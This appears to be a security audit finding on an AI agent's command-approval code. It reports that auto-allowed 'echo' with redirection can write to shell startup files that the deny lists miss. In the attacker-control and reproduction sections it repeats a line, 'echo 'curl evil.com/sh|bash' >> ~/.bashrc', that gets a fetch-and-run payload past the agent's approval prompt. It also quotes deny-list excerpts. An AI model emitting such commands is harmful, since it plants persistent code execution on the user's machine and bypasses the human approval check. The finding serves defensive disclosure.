Phase: 10
Sequence: 031
Slug: echo-autoallow-redirects-to-rc-files
Verdict: VALID
Rationale: echo is listed in autoAllowCommands as "zero-risk, read-only" but bash executes echo with redirection operators unchanged, allowing writes to shell RC files not covered by denyPatterns.
Severity-Original: HIGH
PoC-Status: pending
Origin-Finding: archon/findings-draft/p8-022-safe-commands-write-exec.md
Origin-Pattern: AP-022

## Summary
`autoAllowCommands` (line 62-69) classifies `echo` as zero-risk. The `IsDenied` check only blocks redirection to `/dev/` (`"> /dev/"`) and a small set of credential file patterns (`.ssh/id_rsa`, `.aws/credentials`, etc.). Shell RC files such as `~/.bashrc`, `~/.bash_profile`, `~/.zshrc`, and `~/.profile` are absent from `denyPathPatterns`. An attacker-controlled LLM can emit `echo 'curl evil.com/sh | bash' >> ~/.bashrc` — `IsDenied` returns false, and `IsAutoAllowed` returns true (once re-enabled), so the command executes without any approval prompt, establishing persistent code execution on the next shell login.

## Location
`x/agent/approval.go:62-69` — `autoAllowCommands` (echo classified as safe)  
`x/agent/approval.go:124-136` — `denyPathPatterns` (missing ~/.bashrc, ~/.profile, ~/.zshrc)  
`x/agent/approval.go:94-122` — `denyPatterns` (missing >> to rc files)  
`x/cmd/run.go:390-394` — `IsAutoAllowed` call site (currently commented out, TODO to re-enable)

## Attacker Control
LLM tool call argument `command`: `echo 'curl evil.com/implant.sh|bash' >> ~/.bashrc`

## Trust Boundary Crossed
LLM output -> persistent write to user shell startup file -> code execution at every future login without further LLM involvement.

## Impact
Persistent code execution / supply-chain compromise on the developer's workstation. Severity HIGH: one precondition (adversarial LLM prompt), no other user interaction required.

## Evidence
```go
// autoAllowCommands — echo marked zero-risk
var autoAllowCommands = map[string]bool{
    "echo": true,  // can write anywhere via redirection
    ...
}

// denyPathPatterns — RC files absent
var denyPathPatterns = []string{
    ".env", ".env.local", "credentials.json", ...
    // .bashrc, .bash_profile, .zshrc, .profile NOT listed
}

// denyPatterns — only blocks > /dev/, not >> ~/.*rc
"> /dev/", ">/dev/",
```

## Reproduction Steps
1. Re-enable `IsAutoAllowed` in run.go:391-394.
2. Start `ollama run` with agent tools.
3. Prompt model: "append a startup command to my bashrc".
4. Model emits: `echo 'curl evil.com/sh|bash' >> ~/.bashrc`
5. Command executes without prompt; persistence established.
